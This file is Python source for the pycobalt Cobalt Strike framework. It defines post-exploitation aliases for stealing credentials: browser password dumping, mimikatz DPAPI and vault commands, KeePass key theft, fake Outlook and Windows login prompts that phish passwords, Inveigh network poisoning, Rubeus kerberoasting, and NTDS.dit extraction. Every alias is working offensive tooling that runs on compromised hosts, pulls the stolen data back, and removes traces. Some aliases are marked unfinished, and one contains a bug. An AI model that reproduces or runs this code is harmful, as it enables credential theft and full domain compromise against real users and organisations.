#!/usr/bin/env python3

import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import time

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks
import pycobalt.helpers as helpers
from pycobalt.helpers import powershell_quote
from pycobalt.helpers import cmd_quote

import external

@aliases.alias('sharpweb', 'Grab browser passwords with SharpWeb')
def _(bid, *args):
    external.run(bid, 'sharpweb', args)

@aliases.alias('sharpweb-all', 'Grab Chrome, Firefox, and IE passwords with SharpWeb')
def _(bid, out=None):
    args = ['all']

    # output file
    if out:
        args += ['-o', out]

    external.run(bid, 'sharpweb', args)

@aliases.alias('grab-chrome', 'Grab Chrome passwords with custom tool')
def _(bid):
    #temp = r'{}\AppData\Local'.format(helpers.guess_home(bid))
    temp = r'{}'.format(helpers.guess_home(bid))
    out_file = r'{}\c'.format(temp)
    dest = r'{}\temp.exe'.format(temp)
    helpers.upload_to(bid, utils.basedir('tools/chrome-passwords.exe'), dest)
    aggressor.bshell(bid, r'{} > {} & echo "Chrome credentials ready at {}. Run grab-chrome-next"'.format(cmd_quote(dest), cmd_quote(out_file), out_file))

@aliases.alias('grab-chrome-next', 'Clean up grab-chrome')
def _(bid):
    #temp = r'{}\AppData\Local'.format(helpers.guess_home(bid))
    temp = r'{}'.format(helpers.guess_home(bid))
    out_file = r'{}\c'.format(temp)
    dest = r'{}\temp.exe'.format(temp)
    aggressor.brm(bid, dest)
    aggressor.bdownload(bid, out_file)

@aliases.alias('grab-chrome-next2', 'Clean up grab-chrome')
def _(bid):
    #temp = r'{}\AppData\Local'.format(helpers.guess_home(bid))
    temp = r'{}'.format(helpers.guess_home(bid))
    out_file = r'{}\c'.format(temp)
    aggressor.brm(bid, out_file)

# TODO output dpapi stuff to file (might not be possible with bmimikatz)
@aliases.alias('grab-chrome-mimikatz', 'Grab Chrome passwords and cookies using mimikatz')
def _(bid):
    chrome_dir = r'%localappdata%\Google\Chrome\User Data\Default'
    chrome_dir_guessed = chrome_dir.replace('%localappdata%', r'{}\AppData\Local'.format(helpers.guess_home(bid)))

    login_data = r'{}\Login Data'.format(chrome_dir_guessed)
    cookies = r'{}\Cookies'.format(chrome_dir_guessed)
    history = r'{}\History'.format(chrome_dir_guessed)
    bookmarks = r'{}\Bookmarks'.format(chrome_dir_guessed)
    web_data = r'{}\Web Data'.format(chrome_dir_guessed)
    login_data_copied = '{}.bak2'.format(login_data)
    cookies_copied = '{}.bak2'.format(cookies)

    # non-protected files (History/Bookmarks)
    aggressor.bdownload(bid, history)
    aggressor.bdownload(bid, bookmarks)
    aggressor.bdownload(bid, web_data)

    # protected files (Login Data/Cookies)
    #aggressor.bshell(bid, 'copy "{}" "{}"'.format(login_data, login_data_copied))
    aggressor.bcp(bid, login_data, login_data_copied)

    #aggressor.bshell(bid, 'copy "{}" "{}"'.format(cookies, cookies_copied))
    #aggressor.bmimikatz(bid, r'dpapi::chrome /in:"{}" /unprotect'.format(cookies_copied))
    aggressor.bmimikatz(bid, r'dpapi::chrome /in:"{}" /unprotect'.format(login_data_copied))
    aggressor.brm(bid, login_data_copied)
    #aggressor.brm(bid, cookies_copied)

# TODO dpapi wifi?
# TODO dpapi vault?
# TODO dpapi wwan?
# TODO look at SharpDPAPI
@aliases.alias('creds', 'Grab WCM credentials and DPAPI cache')
def _(bid):
    #aggressor.bmimikatz(bid, r'dpapi::ssh /hive:"%localappdata%\NTUSER.DAT" /unprotect')
    aggressor.bmimikatz(bid, r'vault::cred')
    aggressor.bmimikatz(bid, r'vault::list')
    aggressor.bmimikatz(bid, r'sekurlsa::dpapi')
    aggressor.bmimikatz(bid, r'dpapi::cache')

# TODO get this working
@aliases.alias('wifi-key', 'Get WLAN key from profile')
def _(bid, profile):
    command = """
netsh wlan export profile name="{name}" folder=$env:temp key=clear'
get-content $env:temp:\*{name}*.xml  | select-string -pattern '(keyMaterial)|(keyType)'
rm $profile $env:temp:\*{name}*.xml 
""".format(name=profile)
    aggressor.bpowerpick(bid, command)

# TODO symlink ps1s and test
@aliases.alias('grab-keepass', 'Grab KeePass config and database master key')
def _(bid):
    # KeePassConfig
    aggressor.bpowershell_import(bid, utils.basedir('powershell/KeePassconfig.ps1'))
    aggressor.bpowerpick(bid, "Find-KeePassconfig")

    # KeeThief
    aggressor.bpowershell_import(bid, utils.basedir('powershell/KeeThief.ps1'))
    aggressor.bpowerpick(bid, "Get-KeePassDatabaseKey -Verbose")

@aliases.alias('mimikittenz', 'Invoke mimikittenz')
def _(bid):
    aggressor.bpowershell_import(bid, utils.basedir("powershell/Invoke-mimikittenz.ps1"))
    aggressor.bpowerpick(bid, "Invoke-mimikittenz")

# TODO symlink ps1 and test
@aliases.alias('grab-firefox', 'Grab Firefox passwords')
def _(bid):
    script_file = utils.basedir('powershell/Get-FirefoxPasswords.ps1')
    with open(script_file, 'r') as fp:
        script = fp.read()

    # host it
    cmd = aggressor.beacon_host_script(bid, script)
    #sleep(5)

    # execute in-memory hosted script
    aggressor.bpowerpick(bid, cmd)

@aliases.alias('loginprompt-outlook', 'Phishing login prompt (Outlook variant)')
def _(bid, title='Microsoft Outlook', message='Your Outlook session has expired. Please re-enter your credentials.'):
    aggressor.bpowershell_import(bid, utils.basedir('powershell/Invoke-LoginPrompt.ps1'))

    command = helpers.code_string(r"""
	Stop-Process -Name OUTLOOK
	$out = ShowPrompt "{}" "{}"
	if ($out) {{
	    $out
	    Start-Process outlook
	}} else {{
	    echo "Didn't get the credentials"
	}}
	""".format(title, message))

    # powerpick doesn't work with $host.ui
    aggressor.bpowershell(bid, command, silent=True)

@aliases.alias('loginprompt', 'Phishing login prompt')
def _(bid, title='Windows Security', message='Please re-enter your user credentials.'):
    aggressor.bpowershell_import(bid, utils.basedir('powershell/Invoke-LoginPrompt.ps1'))

    command += helpers.code_string(r"""
	$out = ShowPrompt "{}" "{}"
	if ($out) {{
	    $out
	}} else {{
	    echo "Didn't get the credentials"
	}}
	""".format(title, message))

    # powerpick doesn't work with $host.ui
    aggressor.bpowershell(bid, command, silent=True)

# TODO get working
@aliases.alias('credleak', 'Leak NetNTLMv2 hash using Invoke-CredLeak')
def _(bid):
    aggressor.bpowershell_import(bid, utils.basedir('powershell/Invoke-CredLeak.ps1'))
    aggressor.bpowerpick(bid, 'Invoke-CredLeak')

@aliases.alias('sessiongopher', 'Run SessionGopher')
def _(bid, *args):
    aggressor.bpowershell_import(bid, utils.basedir('powershell/SessionGopher.ps1'))
    aggressor.bpowerpick(bid, 'Invoke-SessionGopher ' + ' '.join(powershell_quote(args)))

@aliases.alias('inveigh', 'Run Inveigh')
def _(bid, runtime=99999, *args):
    aggressor.bpowershell_import(bid, utils.basedir('powershell/Inveigh/Inveigh.ps1'))
    aggressor.bpowerpick(bid, "Invoke-Inveigh -ConsoleOutput N -RunTime {} -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y {}".format(runtime, ' '.join(args)))

@aliases.alias('inveigh-file', 'Run Inveigh, write to %userprofile%\\AppData\\Roaming\\Microsoft')
def _(bid, runtime=99999, *args):
    aggressor.bpowershell_import(bid, utils.basedir('powershell/Inveigh/Inveigh.ps1'))
    aggressor.btask(bid, 'Tasked beacon to run inveigh with output files at %userprofile%\\AppData\\Roaming\\Microsoft')
    aggressor.bpowerpick(bid, r"Invoke-Inveigh -FileOutput Y -FileOutputDirectory $env:userprofile\AppData\Roaming\Microsoft -RunTime {} -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y {}".format(runtime, ' '.join(args)))

@aliases.alias('inveigh-grab', 'Grab inveigh files from %userprofile%\\AppData\\Roaming\\Microsoft')
def _(bid, home=None):
    if not home:
        home = helpers.guess_home(bid)

    directory = r'{}\AppData\Roaming\Microsoft'.format(home)

    aggressor.btask(bid, 'Tasked beacon to grab inveigh files from {}'.format(directory))

    for fname in ('clear', 'log', 'v1', 'v2', 'form'):
        aggressor.bdownload(bid, r'{}\{}'.format(directory, fname))

@aliases.alias('inveigh-clean', 'Clean up inveigh files in %userprofile%\\AppData\\Roaming\\Microsoft')
def _(bid, home=None):
    if not home:
        home = helpers.guess_home(bid)

    directory = r'{}\AppData\Roaming\Microsoft'.format(home)

    aggressor.btask(bid, 'Tasked beacon to remove inveigh files in {}'.format(directory))

    for fname in ('clear', 'log', 'v1', 'v2', 'form'):
        aggressor.brm(bid, r'{}\{}'.format(directory, fname))

@aliases.alias('inveigh-stop', 'Stop Inveigh')
def _(bid):
    aggressor.bpowershell_import(bid, utils.basedir('powershell/Inveigh/Inveigh.ps1'))
    aggressor.bpowerpick(bid, 'Stop-Inveigh')

# Rubeus commands
@aliases.alias('rubeus', 'Run Rubeus')
def _(bid, *args):
    external.run(bid, 'rubeus', args)

@aliases.alias('kerberoast', 'Run Rubeus kerberoast')
def _(bid, *args):
    external.run(bid, 'rubeus', ['kerberoast'] + args)

@aliases.alias('roast', 'Run Rubeus kerberoast and asreproast')
def _(bid):
    external.run(bid, 'rubeus', ['kerberoast'])
    external.run(bid, 'rubeus', ['asreproast'])

@aliases.alias('netripper', 'Run Netripper')
def _(bid, *args):
    aggressor.bpowershell_import(bid, utils.basedir('powershell/Invoke-NetRipper.ps1'))
    aggressor.bpowerpick(bid, r'Invoke-NetRipper -LogLocation C:\Temp\ ' + ' '.join(powershell_quote(args)))

@aliases.alias('ntds', 'Extract NTDS.DIT with NinjaCopy')
def _(bid):
    ntds_source = r'C:\Windows\ntds\ntds.dit'
    system_source = r'C:\Windows\system32\config\SYSTEM'
    ntds_dest = r'C:\Windows\temp\ntds.dit'
    system_dest = r'C:\Windows\temp\SYSTEM'

    aggressor.bpowershell_import(bid, utils.basedir('powershell/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1'))

    command = helpers.code_string(r"""
	Invoke-NinjaCopy -Path "{}" -LocalDestination "{}"
	Invoke-NinjaCopy -Path "{}" -LocalDestination "{}"
	""".format(ntds_source, ntds_dest, system_source, system_dest))

    aggressor.bpowerpick(bid, command)
    aggressor.blog2(bid, 'Files will be at "{}" and "{}"'.format(ntds_dest, system_dest))

    #aggressor.bdownload(bid, ntds_dest)
    #aggressor.bdownload(bid, system_dest)
    ## bdownload is asynchronous so the files must be deleted manually
    #aggressor.blog2(bid, 'You must delete "{}" and "{}" manually once the downloads are complete'.format(ntds_dest, system_dest))

@aliases.alias('powershell-mimikatz', 'Run Invoke-Mimikatz')
def _(bid, command, *args):
    script_file = utils.basedir('powershell/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1')
    with open(script_file, 'r') as fp:
        script = fp.read()

    # host it
    cmd = aggressor.beacon_host_script(bid, script)
    time.sleep(10)

    # execute in-memory hosted script
    engine.message(cmd)
    aggressor.bpowerpick(bid, cmd + ';\n Invoke-Mimikatz -Command {} {}'.format(command, ' '.join(powershell_quote(args))))
